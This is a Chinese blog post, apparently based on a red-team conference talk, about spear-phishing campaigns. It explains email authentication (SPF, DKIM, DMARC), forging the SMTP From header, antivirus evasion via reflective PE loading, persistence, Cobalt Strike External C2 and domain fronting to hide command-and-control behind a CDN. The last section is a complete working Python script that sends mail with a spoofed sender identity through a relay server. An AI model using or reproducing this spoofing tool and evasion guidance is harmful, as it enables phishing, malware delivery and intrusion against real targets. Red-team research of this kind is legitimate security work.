---
date: "2020-02-05T00:00:00Z"
description: 这个议题是我在公司年会上分享的，但正逢招人浪潮袭来，抱着和大家交流技术的想法的同时，想寻觅几个志同道合的同学来一起做研究！议题我将会总结成文字，为大家分享我的学习成果。
title: 红队行动之鱼叉攻击-研究分享
url: /archivers/2020-02-05/1
---


## 演讲简介

《红队行动之鱼叉攻击》围绕着SMTP协议展开，为大家介绍SMTP相关的安全协议，同时会讲解鱼叉攻击的整体过程，以及模拟APT报告进行自动化、武器化的设计。在讲解的过程中，核心围绕Domain-Fronting和External C2这两类红队较为关注的技术，穿插一些HTTP协议相关的基础知识和木马的编写构建。

## 演讲目标

为大家分享SMTP协议相关的基础知识，使大家对邮件安全有一定了解，对未来可能遇到的邮件安全相关问题做一个知识储备，同时也更希望能让大家感受火热的技术氛围，热爱红队、热爱研究，不断攻克工作中遇到的难题。

## 鱼叉攻击概念

“鱼叉攻击”通常是指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马。

在2019年的上半年，安全客上披露了穷奇、海莲花这两个APT组织的攻击活动

### 穷奇（毒云藤）

穷奇组织是一个对我国持续攻击时间长达数十年的老牌APT组织，该组织的攻击活动在2015年左右达到高峰，之后的活动慢慢减少，2019年以来该组织活动减少了很多，攻击频次和攻击范围都大大缩小，但其依然保持活动，如2019年3月份，该组织就使用编号为CVE-2018-20250的WinRAR ACE漏洞向中国大陆数十个重点目标投递了多个RAT木马。投递的RAT木马核心与3年前的版本相比除了配置信息外并未发现新的功能性更新，由此也可印证该组织的活跃度确实在下降。

![2020-02-05-07-04-37](https://images.payloads.online/8378c02e-4f5f-11ec-ba2a-00d861bf4abb.png)

### 海莲花（APT32、OceanLotus）

其攻击的目标众多且广泛，包括政府部门、大型国企、金融机构、科研机构以及部分重要的私营企业等。该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼主题还包括绩效、薪酬、工作报告、总结报告等。

![2020-02-05-07-05-36](https://images.payloads.online/83bb3918-4f5f-11ec-bf01-00d861bf4abb.png)

## 鱼叉攻击背后的攻击链路

![2020-02-05-07-05-47](https://images.payloads.online/841488b0-4f5f-11ec-bedf-00d861bf4abb.png)

通常情况下，黑客通过投递邮件到目标邮件服务器，受害者接收后，经受邮件的诱惑、欺骗，会尝试运行邮件附带的木马，最后进入模块化加载的过程。其中，APT组织在木马模块化的构建过程中，会采用穿插多种复杂的技术以及文件格式，涉及加密解密、Shellcode隐写混淆、反射DLL加载、DLL注入、系统特性等。

经历过木马模块化的过程后，转而进入C2环节，**“C2环节占了红队的大部分工作周期”**，通过C2环节来横向攻击，对目标进行长期的摸排，寻找数据再进而获取数据，这就是整个红队鱼叉的过程。

## SMTP协议简介

简单邮件传输协议 (Simple Mail Transfer Protocol, SMTP) 是在Internet传输email的事实标准。

RFC821：https://tools.ietf.org/html/rfc821

- SMTP默认端口：25
- SSL SMTP默认端口：465

### SMTP相关安全协议 - SPF

发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。

https://www.ietf.org/rfc/rfc4408.txt

`"v=spf1 mx ip4:61.0.2.0/24 ~all"`

设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。

### SMTP相关安全协议 - DKIM

DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。

https://tools.ietf.org/html/rfc6376

### SMTP相关安全协议 - DMARC

DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。
 
![2020-02-05-07-06-09](https://images.payloads.online/844c8d82-4f5f-11ec-9aae-00d861bf4abb.png)

https://en.wikipedia.org/wiki/DMARC#Alignment


## SMTP基础报文结构

这个报文结构需要拿出来重点的阐述一下。

以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。

在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：

- 信封
- 信的内容

![2020-02-05-07-06-19](https://images.payloads.online/8484339a-4f5f-11ec-bd02-00d861bf4abb.png)


注意观察，其中信封中有MAIL FROM，而信的内容中，也有MAIL FROM，这时问题就出现了。


## SMTP Relay欺骗攻击


![2020-02-05-07-06-29](https://images.payloads.online/84c18f92-4f5f-11ec-bc69-00d861bf4abb.png)


通过比对STMP两个报文，我们可以发现，右边的报文中的From信的内容被更改了，此时当B@examle2.com收到的邮件就是P@example3.com发送过来的。

修改From后的邮件会经过邮件网关的检查并且符合邮件服务器配置的安全协议，最终到达邮件客户端。其中邮件客户端可以是浏览器、也可以是邮件客户端软件，一般情况下，邮件客户端是不具备邮件安全协议验证的，因此在客户端会解析成正常邮件。


![2020-02-05-07-06-49](https://images.payloads.online/850646aa-4f5f-11ec-99b0-00d861bf4abb.png)

上图中，我的邮箱地址并不是To，但被穿透进入了我的收件箱。

在早期我还写过类似的介绍：[Swaks伪造邮件](https://payloads.online/archivers/2019-05-09/1)

通过Swaks可以发送简单的邮件来做测试，说了那么多，SMTP Relay有什么办法防御呢？

## Relay技术穿透

![2020-02-05-07-07-03](https://images.payloads.online/855267b0-4f5f-11ec-b6aa-00d861bf4abb.png)

SMTP Relay技术无法穿透配置有DMARC的安全协议的邮件服务。

### DMARC 的运作方式

DMARC 会验证发件人的域名，从而协助电子邮件发件人和收件人验证传入的邮件。DMARC 还定义了应该对传入的可疑邮件执行哪些操作。


要通过 DMARC 检查，必须满足以下条件：

- 传入的邮件必须通过 SPF 或/和 DKIM 的身份验证。
- 邮件的发件人：（From:）标头地址中的域名必须与经过身份验证的域名一致。

https://support.google.com/a/answer/2466580?hl=zh-Hans&ref_topic=7562942


## SMTP Relay 基础设施构建

在这个环节中，需要搭建一个邮件服务器用于转发邮件，其次还需要考虑对C2进行构建、编写。

首先来说邮件服务器，我们可以搭建一个支持SPF、DKIM的邮件服务器，但是搭建起来太麻烦了，是否有符合我们需要的现成的邮件服务器呢？这里可以选择一些免费的企业邮箱服务器，它们的宽容度足够高。宽容度指的是：对垃圾邮件的处理、对邮件安全协议的兼容程度比较高。当邮件服务器接收或者发送一封邮件时，会检查邮件内容，同时收到邮件后，会检测是否支持SPF、DKIM、DMARC，这三者可能大多数发送方邮件服务器都不满足，因此会着重检测SPF，由此说来，SPF是比较重要的一个邮件安全协议且我们仅仅支持SPF、DKIM即可。

![2020-02-05-07-08-07](https://images.payloads.online/8590bf6a-4f5f-11ec-8d6b-00d861bf4abb.png)

![2020-02-05-07-08-28](https://images.payloads.online/85cfaefa-4f5f-11ec-80ad-00d861bf4abb.png)

![2020-02-05-07-08-37](https://images.payloads.online/86051112-4f5f-11ec-95b4-00d861bf4abb.png)

上图是通过swaks来登录一个邮件服务器，去向我的Gmail发送一封邮件，伪造linux.org的邮箱，成功进入收件箱。

## C2构建思路

### C2零接触概念

* 面对IP封禁、IOC标记等这种临时的处置措施，如何持续控制目标？
* 能否有一种技术，使得C2服务器不直接与被控目标直接交互？

![2020-02-05-07-09-06](https://images.payloads.online/863c5492-4f5f-11ec-997b-00d861bf4abb.png)

这里先抛出一个问题，后续我们展开来讲。

再来说说对木马的构建。

### 期望木马达到的效果 – 免杀

免杀的技术已经很多了，而我更喜欢在源码层面进行修改达到免杀，或者自己去写混淆之类的。

常用的技术如下：

![2020-02-05-07-09-16](https://images.payloads.online/8671a282-4f5f-11ec-862b-00d861bf4abb.png)

- [静态恶意代码逃逸（第一课）](https://payloads.online/archivers/2019-11-10/1)
- [静态恶意代码逃逸（第二课）](https://payloads.online/archivers/2019-11-10/2)
- [静态恶意代码逃逸（第三课）](https://payloads.online/archivers/2019-11-10/3)
- [静态恶意代码逃逸（第四课）](https://payloads.online/archivers/2019-11-10/4)
- [静态恶意代码逃逸（第五课）](https://payloads.online/archivers/2019-11-10/5)
- [静态恶意代码逃逸（第六课）](https://payloads.online/archivers/2020-01-02/1)

以上六课是我通过代码层面做的免杀落地，最后一种经常使用，免杀效果很好，文章系列我会继续更新。

### 期望木马达到的效果 – 免杀 PE加载

项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。

爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己的程序代码进行解析，并把不同的节数据加载到对应的内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者、游戏厂商使用比较广泛。

当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。

MemoryModule就是实现了这个核心过程：https://github.com/fancycode/MemoryModule

![2020-02-05-07-11-25](https://images.payloads.online/86ade8b4-4f5f-11ec-bc05-00d861bf4abb.png)

![2020-02-05-07-11-37](https://images.payloads.online/86ec8a6a-4f5f-11ec-a517-00d861bf4abb.png)

详见： [静态恶意代码逃逸（第六课）](https://payloads.online/archivers/2020-01-02/1)

### 期望木马达到的效果 – 体积小

![2020-02-05-07-11-57](https://images.payloads.online/87261b18-4f5f-11ec-aec3-00d861bf4abb.png)

这里主要是在编译前和编译后做一些注意事项，例如静态改为动态编译、压缩壳、远程加载等等。

![2020-02-05-07-12-06](https://images.payloads.online/8761949a-4f5f-11ec-8a6f-00d861bf4abb.png)

如果是调用系统的API，则使用动态链接库代替静态链接。

### 期望木马达到的效果 – 持久可控

![2020-02-05-07-12-15](https://images.payloads.online/87a167c8-4f5f-11ec-81de-00d861bf4abb.png)

这块基本上没什么好展开的，其中 白利用DLL劫持是我经常使用的。

![2020-02-05-07-12-24](https://images.payloads.online/87d6b69e-4f5f-11ec-ba4c-00d861bf4abb.png)

![2020-02-05-07-12-34](https://images.payloads.online/88331812-4f5f-11ec-ab8f-00d861bf4abb.png)

### 期望木马达到的效果 – UAC

用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。

![2020-02-05-07-12-47](https://images.payloads.online/88741d94-4f5f-11ec-b8f6-00d861bf4abb.png)

在编译前,可以直接控制程序启动权限:

![2020-02-05-07-12-55](https://images.payloads.online/88aa5b98-4f5f-11ec-8281-00d861bf4abb.png)

- aslnvoker 默认权限
- highestAvailable 最高权限
- requireAdministrator 必须是管理员权限

我编译选项调整为requireAdministrator,当用户运行程序后,将获得管理员权限会话,不需要绕过UAC了.

## Cobalt Strike

Cobalt Strike是目前应用最多的一款红队C2平台，它的高扩展性、信息同步、网络架构得到很多红队的青睐。

![2020-02-05-07-13-06](https://images.payloads.online/88e6b764-4f5f-11ec-9d81-00d861bf4abb.png)

### External C2

Cobaltstrike External C2 旨在开发者可以通过扩展C2的模型来开发适配不同环境的C2使得目标上线。


* 场景一：解决Web服务器不出网的情况下使得目标上线Cobaltstrike - Jsp php aspx 
* 场景二：内网某台服务器横向的过程中，无法出网，只能通过SMB服务传递数据
* 场景三：通过其他特有的协议，如outlook、网页、Websocket控制目标服务器
* 场景四：其他各种协议
* 场景五：某个目标溯源到C2，同步到多个目标，或C2被威胁情报标记，被封，所有会话丢失 - 应对红蓝对抗

文档链接：https://www.cobaltstrike.com/downloads/externalc2spec.pdf

![2020-02-05-07-13-18](https://images.payloads.online/8923a0f2-4f5f-11ec-80fb-00d861bf4abb.png)

关于External C2就不展开说了,官方文档已经很详细

### External C2 执行流程

![2020-02-05-07-13-26](https://images.payloads.online/895c0c6c-4f5f-11ec-a4db-00d861bf4abb.png)

当客户端请求到控制器后,控制器将会向External C2去请求Stage,这个Stage就是一个DLL文件,将DLL文件拿到客户端内存中后,申请可执行内存页,创建线程即可运行,其中,这个DLL是使用了反射DLL加载技术.


![2020-02-05-07-13-40](https://images.payloads.online/899dad20-4f5f-11ec-8e7b-00d861bf4abb.png)

## Domain Fronting

域前置技术（Domain-Fronting）是一个能够利用CDN识别域名进行转发流量的特性来隐藏命令控制（Command & Control ，C&C）的一种技术。


根据本次议题,我最终实现的C2模型如下:

![2020-02-05-07-13-53](https://images.payloads.online/89dc8be4-4f5f-11ec-bc5c-00d861bf4abb.png)


### Domain Fronting – HTTP 请求

一个正常的域名解析-请求-响应过程：

![2020-02-05-07-14-03](https://images.payloads.online/8a1c92b6-4f5f-11ec-9ca7-00d861bf4abb.png)

当客户端向服务器要请求一个网站时,会先经过DNS请求，然后获得Ｗeb服务器的IP地址进行Socket连接,那么接下来我们再来引入CDN的概念．

### Domain Fronting –  CDN

CDN，内容分发网络（Content Delivery Network，CDN）通过将站点内容发布至遍布全国的海量加速节点，使其用户可就近获取所需内容，避免网络拥堵、地域、运营商等因素带来的访问延迟问题，有效提升下载速度、降低响应时间，提供流畅的用户体验。

![2020-02-05-07-14-13](https://images.payloads.online/8a61630a-4f5f-11ec-8b22-00d861bf4abb.png)

- Origin Server ： 源站，是网站本身，CDN会将请求以最短路径转发至源站。
 
- Host：HTTP请求中的Host是CDN寻找源站的依据。

假设我将mail-box.163.com加入CDN中，向任意节点请求如下数据包，CDN将会把请求转发至mail-box.163.com指定的源站上。

```
GET /stage HTTP/1.1
Host: mail-box.163.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari
Connection: Keep-Alive
Cache-Control: no-cache
```
### External C2 – 控制器的设计（HTTP协议状态化）

HTTP协议是无状态的，同时有两个会话上线就糟糕了 - 现以采用SESSION-ID来确定Socket套接字。

![2020-02-05-07-14-30](https://images.payloads.online/8a9d7412-4f5f-11ec-b39f-00d861bf4abb.png)

SESSION-ID：这里的SESSION-ID等于木马在本地生成的Windows GUID。

![2020-02-05-07-14-41](https://images.payloads.online/8ae0b006-4f5f-11ec-82f8-00d861bf4abb.png)

最终实现了这一项目，将External C2隐藏在CDN后方。

## 鱼叉攻击

### 鱼叉攻击的木马表现形式

* 宏 – Office
* DLL劫持
* 假冒加固工具
* 木马捆绑

![2020-02-05-07-14-51](https://images.payloads.online/8b47be36-4f5f-11ec-8617-00d861bf4abb.png)

通常办公软件具有最大的安装量，将文档插入邮件中已经是惯用的工作方式，因此许多APT组织在进行鱼叉攻击的过程中也会穿插许多关于Ｏffice的利用技巧。

    
### 鱼叉攻击 – 信

![2020-02-05-07-15-00](https://images.payloads.online/8b92ddee-4f5f-11ec-a16b-00d861bf4abb.png)

上图是我根据分析一些鱼叉攻击的邮件来总结的特点。

信需要串联许多细节性的信息，根据人类的心理，寻找突破口。将目标构建在一个它所熟悉的区域内，将会降低他的警惕性。


### 鱼叉攻击 – 自动化

![2020-02-05-07-15-08](https://images.payloads.online/8bd0f444-4f5f-11ec-ad16-00d861bf4abb.png)

```python
#!/usr/bin/python
"""
@Rvn0xsy - 鱼叉自动化脚本

该脚本需要一个邮件服务器用来Relay，其次需要一个邮件正文eml文件用于发送，邮件服务器需要满足以下条件：

1.支持转发
2.SPF
3.DKIM

格式解释：
'=?UTF-8?B?这里是BASE64编码?='

B = Base64

其中eml文件需要去除Header部分，脚本负责重构。


Example >

$ python .\smtp-relay.py -f <发送邮箱> -t <目标邮箱> -u <邮箱用户名> -p <邮箱密码> -r <伪造对象> --relay_name <伪造对象名称> --subject <邮件标题> -b <邮件正文文件>
~\Desktop> python .\smtp-relay.py -f rvn0xsy@gmail.com -t rvn0xsy@gmail.com -u user -p XXX -r admin@gmail.com --relay_name 二维码科技 --subject 测试 -b .\send.eml
2019-07-24 22:39:50,861 - .\smtp-relay.py[line:80] - INFO: 235 Authentication successful
2019-07-24 22:39:53,979 - .\smtp-relay.py[line:52] - INFO: 250 Data Ok
2019-07-24 22:39:53,983 - .\smtp-relay.py[line:87] - INFO: QUIT

PS: DATA内容就是eml文件

============<Header>============
Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)
From: =?UTF-8?B?xxx?= xxx
To: xxx
Subject: =?UTF-8?B?xxx?=
============</Header>============

============<DATA>============

X-Mailer: Server Version 1.0
Content-Type: multipart/mixed; 
	boundary="----=_Part_65_550351629.1563948317509"
MIME-Version: 1.0
Message-ID: <7a422a.12.16c22957b47.xxx>
Date: Wed, 24 Jul 2019 15:47:10 +0800 (CST)

------=_Part_65_550351629.1563948317509
Content-Type: multipart/alternative; 
	boundary="----=_Part_67_1156720723.1563948317510"

------=_Part_67_1156720723.1563948317510
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: base64

5L2g5Lus5aW95qOS77yB5Yqg5rK577yB

------=_Part_67_1156720723.1563948317510

============</DATA>============
"""
import telnetlib
import time
import logging
import base64
import argparse

logging.basicConfig(format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s',level=logging.INFO)

class SMTPClient():
    def __init__(self,):
        self.mail_from = ''
        self.mail_to = []
        self.send_data = ''
        self.mail_header = ''
        self.tn = telnetlib.Telnet()
    def set_mail_header(self,mail_subject,mail_relay,mail_relay_name):
        now_date = time.strftime("%a, %d %b %Y %H:%M:%S +0800 (CST)", time.localtime())
        self.mail_header = "Date: {}\r\nFrom: =?UTF-8?B?{}?= <{}>\r\nTo: {}\r\nSubject: =?UTF-8?B?{}?=\r\n".format(now_date,
            base64.b64encode(mail_relay_name.encode()).decode(),
            mail_relay,
            self.mail_to[0],base64.b64encode(mail_subject.encode()).decode())
        
    def set_mail(self,mail_from,mail_to,send_body):
        self.mail_from = mail_from
        self.mail_to = mail_to
        with open(send_body, "rb") as f_body:
            self.send_data = f_body.read()
        f_body.close()
    def send_ehlo(self, content):
        self.tn.write(content.encode())

    def send_mail(self):
        mail_from = "MAIL FROM:<%s>" % self.mail_from
        logging.info(mail_from)
        # 250 Mail Ok
        self.tn.write(mail_from.encode() + b'\r\n')
        self.tn.read_until(b"250 Mail Ok\r\n",timeout=3)
        logging.info("250 Mail Ok")
        
        for mail in self.mail_to:
            mail_rpct = "RCPT TO:<%s>" % mail
            self.tn.write(mail_rpct.encode() + b'\r\n')
            self.tn.read_until(b"250 Rcpt Ok\r\n",timeout=3)
            logging.info(mail_rpct)
        # 250 Rcpt Ok
        self.tn.write(b'DATA\n')
        self.tn.read_until(b"354 End data with <CR><LF>.<CR><LF>\r\n",timeout=3)
        # 354 End data with <CR><LF>.<CR><LF>
        send_all = self.mail_header.encode()+self.send_data+b"\r\n.\r\n"
        # self.tn.write(self.mail_header.encode()+b"\r\n")
        # self.tn.write(self.send_data+b"\r\n.\r\n")
        self.tn.write(send_all)
        # 250 Data Ok: queued as freedom
        self.tn.read_until(b"250 Data Ok: queued as freedom\r\n",timeout=3)
        logging.info("250 Data Ok")
    def login_host(self,host_ip,username,password):
        try:
            self.tn.open(host_ip,port=25)
        except:
            logging.warning('%s Connect Error..'%host_ip)
            return False
        self.send_ehlo("EHLO virtual-machine\r\n")
        # 250-smtp.aliyun-inc.com
        # 250-STARTTLS
        # 250-8BITMIME
        # 250-AUTH=PLAIN LOGIN XALIOAUTH
        # 250-AUTH PLAIN LOGIN XALIOAUTH
        # 250-PIPELINING
        # 250 DSN
        self.tn.read_until(b"250-smtp.aliyun-inc.com\r\n",timeout=3)
        self.tn.read_until(b"250-STARTTLS\r\n",timeout=3)
        self.tn.read_until(b"250-8BITMIME\r\n",timeout=3)
        self.tn.read_until(b"250-AUTH=PLAIN LOGIN XALIOAUTH\r\n",timeout=3)
        self.tn.read_until(b"250-AUTH PLAIN LOGIN XALIOAUTH\r\n",timeout=3)
        self.tn.read_until(b"250-PIPELINING\r\n",timeout=3)
        self.tn.read_until(b"250 DSN\r\n",timeout=3)
        self.tn.write(b"AUTH LOGIN\r\n")
        self.tn.read_until(b"334 dXNlcm5hbWU6\r\n",timeout=3)
        self.tn.write(base64.b64encode(username.encode()) + b'\r\n')
        self.tn.read_until(b"334 UGFzc3dvcmQ6\r\n",timeout=3)
        self.tn.write(base64.b64encode(password.encode()) + b'\r\n')
        self.tn.read_until(b"235 Authentication successful\r\n",timeout=3)
        logging.info("235 Authentication successful")
        return True

    def logout_host(self):
        self.tn.write(b"QUIT\r\n")
        self.tn.read_until(b"221 Bye\r\n",timeout=3)
        self.tn.close()
        logging.info("QUIT")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.description = "AMAIL SMTP Relay Client - Version 1.0"
    parser.add_argument("-f","--mail_from",type=str,help="Mail From",required = True)
    parser.add_argument("-t","--mail_to",type=str,help="Mail To",required = True)
    parser.add_argument("-u","--username",type=str,help="SMTP Username",required = True)
    parser.add_argument("-p","--password",type=str,help="SMTP Password",required = True)
    parser.add_argument("-s","--server",type=str,help="SMTP Server", default="smtp.mxhichina.com")
    parser.add_argument("-b","--body",type=str,help="Mail Body", required = True)
    parser.add_argument("-r","--relay",type=str,help="Mail Relay To", required = True)
    parser.add_argument("--relay_name",type=str,help="Mail Relay To Name", required = True)
    parser.add_argument("--subject",type=str,help="Mail Subject", required = True)
    args = parser.parse_args()
    
    smtp_client = SMTPClient()

    if smtp_client.login_host(args.server,args.username,args.password):
        smtp_client.set_mail(args.mail_from,args.mail_to.split(","),args.body)
        smtp_client.set_mail_header(args.subject,args.relay,args.relay_name)
        smtp_client.send_mail()
        smtp_client.logout_host()
```
